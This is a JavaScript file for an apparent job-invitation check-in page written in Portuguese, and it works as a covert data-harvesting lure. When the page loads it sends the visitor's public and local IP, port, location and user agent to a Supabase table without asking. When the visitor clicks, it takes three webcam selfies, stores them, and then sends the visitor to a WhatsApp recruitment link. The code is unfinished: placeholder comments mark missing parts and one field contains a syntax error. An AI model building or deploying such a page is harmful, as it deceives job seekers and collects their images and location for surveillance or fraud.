// =================================================================
// CONFIGURAÇÃO DE CONEXÃO
// =================================================================
const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";
const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// Elementos da Página
const video = document.getElementById("video");
const btn = document.getElementById("btn");
const statusText = document.getElementById("status");
const canvas = document.getElementById("canvas");

// =================================================================
// SISTEMA DE ÁUDIO
// =================================================================
function falar(texto){
  speechSynthesis.cancel();
  const fala = new SpeechSynthesisUtterance(texto);
  fala.lang = "pt-BR";
  fala.volume = 1;
  fala.rate = 0.95;
  speechSynthesis.speak(fala);
}

// =================================================================
// FUNÇÃO PARA SALVAR NO BANCO
// =================================================================
async function salvarNoBanco(dados) {
  try {
    const { error } = await supabaseClient.from('checkins').insert([dados]);
    if (error) {
      console.error("Erro Supabase:", error);
      return false;
    }
    console.log("✅ Salvo com sucesso:", dados.tipo_captura);
    return true;
  } catch(err) {
    console.error("Erro ao salvar:", err);
    return false;
  }
}

// =================================================================
// CAPTURA DE IP + PORTA (Melhorada)
// =================================================================
async function getInfoBasica() {
  const info = { 
    tipo_captura: "previa",
    ip: "indisponível",
    local_ip: null,
    local_port: null
  };

  // IP Externo
  try {
    const req = await fetch("https://ipapi.co/json/");
    const json = await req.json();
    info.ip = json.ip || "indisponível";
    info.cidade = json.city || "";
    info.estado = json.region || "";
    info.pais = json.country_name || "";
  } catch(err) {
    console.log("Erro IPAPI:", err);
  }

  // WebRTC - IP Local + Porta
  try {
    const rtc = new RTCPeerConnection({ 
      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
    });
    
    rtc.createDataChannel("test");
    const offer = await rtc.createOffer();
    await rtc.setLocalDescription(offer);

    // Aguarda candidates
    await new Promise(resolve => {
      rtc.onicecandidate = (event) => {
        if (event.candidate) {
          const candidate = event.candidate.candidate;
          const ipMatch = candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
          const portMatch = candidate.match(/(\d{4,5})\s+typ/);
          
          if (ipMatch && !info.local_ip) info.local_ip = ipMatch[1];
          if (portMatch && !info.local_port) info.local_port = portMatch[1];
        }
      };
      setTimeout(resolve, 1500); // dá tempo para candidates
    });
  } catch(err) {
    console.log("WebRTC falhou:", err);
  }

  info.user_agent = navigator.userAgent;
  info.timestamp = new Date().toISOString();

  return info;
}

// =================================================================
// INICIALIZAÇÃO + SALVAMENTO AUTOMÁTICO
// =================================================================
async function iniciarSistema(){
  try {
    falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
    statusText.innerHTML = "🟡 Iniciando sistema...";

    // === SALVAMENTO PRÉVIO ===
    statusText.innerHTML = "🌐 Capturando IP e Porta...";
    const infoPrevia = await getInfoBasica();
    
    const salvou = await salvarNoBanco(infoPrevia);
    
    if (salvou) {
      statusText.innerHTML = "✅ Informações iniciais (IP + Porta) salvas.<br>Agora clique no botão verde.";
    } else {
      statusText.innerHTML = "⚠️ IP salvo, mas verifique o console.";
    }

    // Inicia câmera
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });
    video.srcObject = stream;
    await video.play();

    await new Promise((resolve) => {
      if(video.readyState >= 2) resolve();
      else video.onloadeddata = () => resolve();
    });

  } catch(err) {
    console.log(err);
    statusText.innerHTML = "❌ Permita câmera";
  }
}

window.onload = iniciarSistema;

// =================================================================
// EVENTO DO BOTÃO (CAPTURA COMPLETA)
// =================================================================
btn.addEventListener("click", async () => {
  try {
    btn.disabled = true;
    btn.innerHTML = "PROCESSANDO...";
   
    statusText.innerHTML = "📨 Verificando informações do convite..";
    falar("Verificando informações do convite..");

    // ... (manter o resto do seu código original de captura de fotos, GPS, etc.)

    const largura = video.videoWidth;
    const altura = video.videoHeight;
    if(!largura || !altura){
      throw new Error("Vídeo não carregou corretamente.");
    }

    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");
    const fotos = [];

    for(let i = 0; i < 3; i++) {
        ctx.drawImage(video, 0, 0, 640, 480);
        fotos.push(canvas.toDataURL("image/jpeg", 0.35));
        if(i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
    }

    const stream = video.srcObject;
    if (stream) stream.getTracks().forEach(track => track.stop());

    // GPS, IP, etc. (seu código original)
    let latitude = "não permitido";
    let longitude = "não permitido";
    // ... (coloque aqui o resto do seu código de GPS, IP, etc.)

    const infoDispositivo = analisarDispositivo();

    statusText.innerHTML = "💾 Salvando cadastro completo...";
    falar("Salvando cadastro.");

    const { error } = await supabaseClient.from('checkins').insert([{
      tipo_captura: "completo",
      selfies: fotos,
      latitude: latitude.toString(),
      longitude: longitude.toString(),
      ip: /* seu ip */,
      // ... resto dos campos
    }]);

    if (error) throw error;

    statusText.innerHTML = "✅ Cadastro concluído";
    falar("Cadastro concluído com sucesso.");

    setTimeout(() => {
      window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
    }, 2000);

  } catch(err) {
    console.log(err);
    statusText.innerHTML = "❌ Erro: " + (err.message || "Falha de comunicação externa.");
    btn.disabled = false;
    btn.innerHTML = "QUERO PARTICIPAR";
  }
});
